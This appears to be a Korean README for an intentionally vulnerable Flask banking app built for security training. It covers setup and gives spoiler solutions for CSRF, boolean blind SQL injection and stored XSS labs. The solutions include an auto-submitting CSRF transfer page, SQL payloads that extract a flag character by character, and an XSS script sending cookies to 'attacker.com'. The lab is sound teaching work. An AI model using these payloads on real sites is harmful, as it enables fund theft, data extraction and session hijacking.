# 🏦 HallymBank — Flask 기반 보안 실습 웹 애플리케이션

> **교육용 실습 전용 프로젝트입니다.**  
> 이 코드는 실제 서비스 환경에 절대 배포하거나 인터넷에 노출하지 마세요.  
> 로컬 환경에서만 Boolean-based Blind SQL Injection실습을 위한 학습용으로 설계되었습니다.

---

>python 3.13.xx 버전에서는 실행이 안됩니다. 3.11.x 버전으로 설치해주세요!

## 🚀 실행 방법

### 🧭 프로젝트 내려받기
원하는 폴더로 이동
```
cd C:\Users\내이름\Desktop\Hallymbank
```

GitHub에서 프로젝트 클론
```
git clone https://github.com/mongttangtta/Hack-n-Learn.git
```

프로젝트 폴더로 이동
```
cd Hack-n-Learn
```

브랜치 변경
```
git fetch origin
git checkout Secure
```

폴더 구조가 아래처럼 보이면 정상:
```
HallymBank/  
├── app.py  
├── init_db.py  
├── requirements.txt  
├── templates/  
└── static/  
  ```
### 가상환경(venv) 만들기
Python이 설치되어 있는지 확인 (예: Python 3.11.5 가 나오면 OK)
```
python --version
```

가상환경 생성
```
python -m venv venv
```

가상환경 활성화
```
venv\Scripts\activate
```

실행 후 프롬프트에 (venv) 표시가 보이면 성공:
```
(venv) C:\Users\내이름\Desktop\HallymBank>
```

### 📦 의존성(Flask 등) 설치

프로젝트 폴더 안에는 requirements.txt 파일이 있음. 설치가 끝나면 “Successfully installed Flask…” 같은 메시지가 나와야 함.
```
pip install -r requirements.txt
```


### 🗄️ 데이터베이스 초기화

Flask 앱은 SQLite DB 파일(vuln_bank.db)을 사용하므로, 최초 실행 전 한 번 DB를 생성해줘야 함.
```
python init_db.py
```

정상이라면 아래 메시지가 표시됨:
```
DB initialized: vuln_bank.db
FLAG stored in flags table (NOT in posts).
```

→ 이제 같은 폴더에 vuln_bank.db 파일이 생긴 것을 확인.

### 🚀 Flask 서버 실행
```
python app.py
```

다음 메시지가 뜨면 성공:
```
 * Running on http://127.0.0.1:5000 (Press CTRL+C to quit)
```
### 🌐 브라우저로 접속

크롬 또는 엣지에서 아래 주소 입력:
```
http://127.0.0.1:5000
```

✅ 첫 화면: 공지사항 + 자유게시판이 보이면 정상 작동!


---
## ⚙️ 1. 작동 원리

이 프로젝트는 Flask 기반의 간단한 “은행 시뮬레이션 웹사이트”로,
**회원 로그인, 게시판, 송금, 공지사항 검색 기능**을 제공합니다.

보안 교육을 위해 일부 구문은 **의도적으로 취약하게 작성**되어 있습니다.  
특히 `/board/notice` 내 검색 기능은 SQL 구문을 문자열로 직접 조합하여 **SQL Injection 실습**이 가능하도록 설계되었습니다.

---

## 🧩 2. 기능 설명

| 기능 | 경로 | 설명 |
|------|------|------|
| 홈 | `/` | 공지사항과 자유게시판의 최신 글 목록 표시 |
| 로그인/로그아웃 | `/login`, `/logout` | 사용자 인증 (admin / alice / bob 샘플 계정) |
| 게시판 | `/board/<board>` | 공지사항(notice), 자유게시판(free) — 글 목록 및 검색 가능 |
| 글쓰기 | `/write` | 로그인 후 글 작성 가능 (admin만 공지 작성 가능) |
| 글삭제 | `/delete/<id>` | 작성자 또는 admin만 삭제 가능 (CSRF 토큰 검증) |
| 계좌정보 | `/account` | 현재 로그인한 사용자의 계좌 정보 조회 |
| 송금 | `/transfer` | 다른 사용자에게 금액 송금 (CSRF 토큰 검증) |
| DB 초기화 | `python init_db.py` | DB를 삭제하고 다시 생성 (FLAG 포함) |

---

## 🧠 3. 코드 리뷰

### 📁 app.py
- **Flask 메인 애플리케이션**
- `get_db()` / `init_db()` : SQLite 연결 및 초기 데이터 삽입
- `index()` : 홈 화면, 최신 게시글 목록 렌더링
- `login()` / `logout()` : 세션 기반 인증 관리
- `board()` :
  - 게시글 목록 및 검색 기능 제공
  - `q` 변수에 사용자가 입력한 문자열을 그대로 SQL문에 포함시켜 **의도적 취약점 존재**
- `write()` : 게시글 작성 (CSRF 토큰 확인 및 관리자 권한 구분)
- `delete()` : 삭제 요청 시 CSRF 및 권한 검증 수행
- `transfer()` : 금액 송금 기능 (정상 동작 시 result.html 렌더링)
- `account()` : 로그인 사용자 잔액 정보 표시

> ✅ **리뷰 요약**
> - 코드 구조가 명확하고 함수 단위로 역할이 분리되어 있음  
> - Flask의 세션과 CSRF 토큰을 직접 구현함으로써 보안 개념 학습에 적합  
> - SQL Injection 교육용 부분은 명확히 주석되어 있어 학습자 실험에 유용  
> - 단, `vulnerable_sql = f""" ... """` 부분은 반드시 로컬 학습용으로만 실행해야 함.

---

### 📁 init_db.py
- DB 초기화 스크립트로, 기존 DB 삭제 후 새로 생성합니다.
- `users`, `posts`, `flags` 테이블을 초기화하고 샘플 데이터를 삽입합니다.
- `FLAG{HackAndLearn}` 문자열은 **flags 테이블에만 저장**됩니다.

> ✅ **리뷰 요약**
> - 교육용으로 DB를 항상 깨끗하게 재생성하도록 설계되어 실습 시 편리함  
> - `os.remove(DB)` 를 통해 이전 파일 완전 삭제  
> - FLAG 위치를 명확히 분리해 보안 개념 학습에 적합

---

### 📁 templates (Jinja2)
| 파일 | 역할 | 주요 포인트 |
|------|------|-------------|
| `base.html` | 전체 레이아웃 (헤더/네비게이션/로그인 상태 표시) | 관리자, 일반회원 뱃지 색상 구분 |
| `home.html` | 공지사항/자유게시판 최신글 + 로그인폼 | 세션 기반 표시 |
| `board.html` | 게시판 목록 및 검색폼 | SQLi 실습 대상 |
| `post.html` | 단일 게시글 표시 | 삭제 버튼 시 CSRF 토큰 포함 |
| `write.html` | 글쓰기 | 관리자만 공지 작성 가능 |
| `transfer.html` | 송금 기능 | CSRF 토큰 포함, 송금 성공 여부 표시 |
| `result.html` | 송금 결과 페이지 | 성공/실패 메시지 표시 |
| `account.html` | 사용자 계좌 정보 | 이름, 아이디, 잔액 표시 |

> ✅ **리뷰 요약**
> - 템플릿 파일은 일관된 UI와 학습용 UX를 갖춤  
> - badge 클래스로 관리자/회원 시각적 구분  
> - `confirm()` 기반 삭제 확인 등 실습 편의 고려  

---

### 📁 static/style.css
- 사이트 전반의 기본 스타일을 정의.
- 카드형 UI, 반응형 레이아웃, 상단 네비게이션 구성.
- 배지, 버튼, 테이블, 폼 등 시각적 요소 구분.

> ✅ **리뷰 요약**
> - 깔끔한 기본 CSS 구조  
> - 학습용 사이트로서 가독성과 직관성 우수  

---

---

## 🔍 각 취약점 정답(풀이) 보기

> ⚠️ 이 아래 내용은 **정답 스포일러**입니다.  
> 수강자에게는 **먼저 직접 풀어보게 한 뒤**, 복습용으로 보여주는 걸 추천합니다.

---

<details>
  <summary><strong>🧊 CSRF – 송금 CSRF & Base64 FLAG</strong></summary>

### 1) 실습 환경 실행

```bash
cd CSRF
python init_db.py      # DB 초기화 (사용자, 게시글, FLAG(Base64) 세팅)
python app.py          # 서버 실행
브라우저에서 http://127.0.0.1:5000 접속.

2) 피해자 계정으로 로그인
예: bob / bob123 로 로그인
→ 우측 “현재 로그인: bob” 이 보이면 OK.

3) 송금 기능 파라미터 확인
송금하기 메뉴(/transfer)에서 개발자 도구로 폼 구조 확인:

메서드: POST

URL: /transfer

파라미터: receiver, amount, (정상 폼에는 csrf_token 도 있음)

핵심: 서버는 csrf_token 이 없는 요청도 처리하는 취약한 분기 존재.

4) 공격 페이지(attack.html) 작성
아무 폴더에 attack.html 생성 후:

html
코드 복사
<!doctype html>
<html>
<head><meta charset="utf-8"><title>CSRF Attack Demo</title></head>
<body>
  <h3>이 페이지가 열리는 순간, 백그라운드에서 은밀하게 송금이 일어납니다.</h3>

  <form id="f"
        action="http://127.0.0.1:5000/transfer"
        method="POST">
    <!-- 공격자는 CSRF 토큰을 모르므로 넣지 않는다 -->
    <input type="hidden" name="receiver" value="bob">
    <input type="hidden" name="amount"   value="1000">
  </form>

  <script>
    window.onload = function () {
      document.getElementById('f').submit();
    };
  </script>
</body>
</html>
5) 공격 페이지 열기
bash
코드 복사
python -m http.server 8001   # attack.html 있는 폴더에서
그리고 같은 브라우저에서 (이미 bob으로 로그인된 상태):

http://127.0.0.1:8001/attack.html 접속

→ 자동으로 /transfer 로 POST 가 날아가고, 서버는 CSRF 공격 성공 처리.

6) FLAG(Base64) 확인 & 디코딩
HallymBank 탭의 결과 페이지에 예를 들어:

text
코드 복사
CSRF 공격 성공! FLAG:
Base64(RkxBR3tDU1JGX0FUVEFDS19TVUNDRVNTfQ==)
같은 메시지가 뜬다.

터미널에서 Base64 디코딩:

bash
코드 복사
python - << 'EOF'
import base64
s = "RkxBR3tDU1JGX0FUVEFDS19TVUNDRVNTfQ=="
print(base64.b64decode(s).decode())
EOF
→ 최종 FLAG 예시:

text
코드 복사
FLAG{CSRF_ATTACK_SUCCESS}
</details>
<details> <summary><strong>🧮 SQL Injection – Boolean 기반 Blind SQLi</strong></summary>
주의: 실제 문제 세부 구조는 /SQLi 폴더의 코드와 README 를 기준으로 한다.
아래는 전형적인 풀이 흐름 예시이다.

1) 환경 실행
bash
코드 복사
cd SQLi
python init_db.py
python app.py
http://127.0.0.1:5000 접속 → alice / alice123 등으로 로그인.

2) 취약 지점 찾기
공지사항/게시판 검색폼 등에서 q 파라미터가
아래와 같이 직접 SQL 문에 삽입되는 구조를 발견:

sql
코드 복사
... WHERE board='notice' AND ( <여기에 q 내용이 들어감> ) ORDER BY ...
예시 테스트 입력: 1=1, 1=2 → 결과 개수 차이가 나면 Boolean 기반 Blind 가능.

3) Blind SQLi로 FLAG 추출
DB 안에 flags 테이블이 있다고 가정:

sql
코드 복사
(SELECT substr(flag,1,1) FROM flags WHERE id=1) = 'F'
와 같이 조건을 넣어 두고,
검색 결과가 나오는지/안 나오는지를 이용해 한 글자씩 알아낸다.

파라미터 예시:

text
코드 복사
q=(SELECT substr(flag,1,1) FROM flags)= 'F'
q=(SELECT substr(flag,2,1) FROM flags)= 'L'
...
자동화 스크립트를 쓰면 더 편하지만, 교육용에서는
1~N 번째 문자에 대해 이분 탐색 or 알파벳 하나씩 대입 →
FLAG{...} 문자열이 완성되면 문제 해결.

4) 최종 FLAG
실제 FLAG 값은 /SQLi/init_db.py 의 flags 테이블에만 저장되어 있고,

게시판 글/HTML 어디에도 직접 노출되지 않는다.

Blind SQLi 로 읽어낸 문자열이 최종 FLAG 가 된다.

</details>
<details> <summary><strong>💥 XSS – 저장형 XSS & 세션 탈취 체험</strong></summary>
역시 구체 코드는 /XSS 폴더의 app.py / README 를 기준으로 한다.
여기서는 저장형 XSS 기본 풀이 흐름만 정리했다.

1) 환경 실행
bash
코드 복사
cd XSS
python init_db.py   # 있다면
python app.py
http://127.0.0.1:5000 접속 → victim 혹은 일반 사용자 계정으로 로그인.

2) 취약 입력 지점 찾기
댓글/게시글 작성 폼에서 내용(content) 이
서버에서 필터링/이스케이프 없이 곧바로 HTML 로 렌더링 되는 지점 확인:

html
코드 복사
<div>
  {{ post.content }}   <!-- escape 없이 그대로 -->
</div>
이 경우 <script>...</script> 같은 태그가 그대로 동작한다.

3) 기본 XSS 페이로드 테스트
글쓰기/댓글 입력에 다음과 같이 입력:

html
코드 복사
<script>alert('XSS');</script>
→ 글을 다시 볼 때 alert 창이 뜨면 저장형 XSS 성공.

4) (선택) 세션 탈취/FLAG 획득 예시
문제에 따라 document.cookie 또는 특정 FLAG 값을
공격자 서버로 전송하는 JS 를 작성할 수 있다:

html
코드 복사
<script>
  // 예: 공격자 서버로 쿠키 전송
  new Image().src = "http://attacker.com/log?c=" + encodeURIComponent(document.cookie);
</script>
혹은, 앱이 특정 페이지에서 FLAG{...} 를 DOM 에 숨겨두었다면,
자바스크립트로 innerText 를 읽어 alert / 로그 등으로 노출시키게 할 수도 있다.

5) 정답 처리
XSS 페이로드가 정상 동작하여 FLAG{...} 를 확인하거나,

공격자 서버 로그에서 FLAG/쿠키를 확인하면 문제 해결.

</details> ```



